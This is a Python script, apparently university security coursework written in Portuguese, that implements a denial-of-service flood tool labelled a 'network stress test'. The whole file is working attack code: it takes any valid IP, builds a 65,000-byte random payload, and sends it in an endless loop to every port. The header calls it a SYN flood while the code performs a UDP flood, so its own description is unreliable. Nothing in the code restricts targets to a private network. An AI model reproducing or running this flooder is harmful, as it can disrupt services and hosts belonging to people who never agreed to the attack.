# Paulo Abade - 23919
# Mestrado de Engenharia de Segurança Informática
# Iniciado em 20/10/2025
# Última atualização: 06/02/2026

# Faz um ataque de SYN Flood a um IP e a uma porta que tenham sido especificados pelo utilizador

import ipaddress
import socket
import random
import time


def dos_attack():
    """
    Executa a rotina de ataque UDP Flood direcionada a um IP alvo.
    
    A função solicita ao utilizador um endereço IP válido, gera um payload 
    aleatório de grande dimensão (65000 bytes) e inicia um ciclo infinito 
    de envio de pacotes UDP percorrendo todo o range de portas (1-65535).
    
    Mecanismo de Auditoria:
        - Protocolo: UDP (Connectionless)
        - Payload: Dados aleatórios gerados via urandom.
        - Vetor: Exaustão de recursos de rede e CPU.
    """
    print("DoS Attack - Network Stress Test")

    # Validar o endereço IP
    is_an_ip = False
    target_ip = ""
    
    while not is_an_ip:
        target_ip = input("Insira um IP dentro da sua rede privada (ex: 192.168.1.254): \n")
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            is_an_ip = True
        except ValueError:
            print("Erro: Formato de IP inválido.\n")

    # Criação do socket UDP
    # AF_INET = IPv4 | SOCK_DGRAM = Protocolo UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    
    # Geração de 65KB de dados aleatórios para maximizar o consumo de banda
    message_bytes = random._urandom(65000) 
    sent = 0
    
    print(f"[*] A iniciar teste de stress em {target_ip}...")
    
    try:
        while True:
            # Iteração sobre o range completo de portas TCP/UDP
            for port in range(1, 65536):
                # Envio do pacote binário para o destino
                sock.sendto(message_bytes, (target_ip, port))
                sent += 1
                
                # Intervalo mínimo para evitar o bloqueio imediato do socket local
                time.sleep(0.00001) 
                
                if sent % 100 == 0:
                    print(f"[i] Pacotes enviados: {sent}", end="\r")
                    
    except KeyboardInterrupt:
        print(f"\n[!] Teste interrompido pelo utilizador. Total enviado: {sent}")
    except Exception as e:
        print(f"\n[!] Erro durante a execução: {e}")
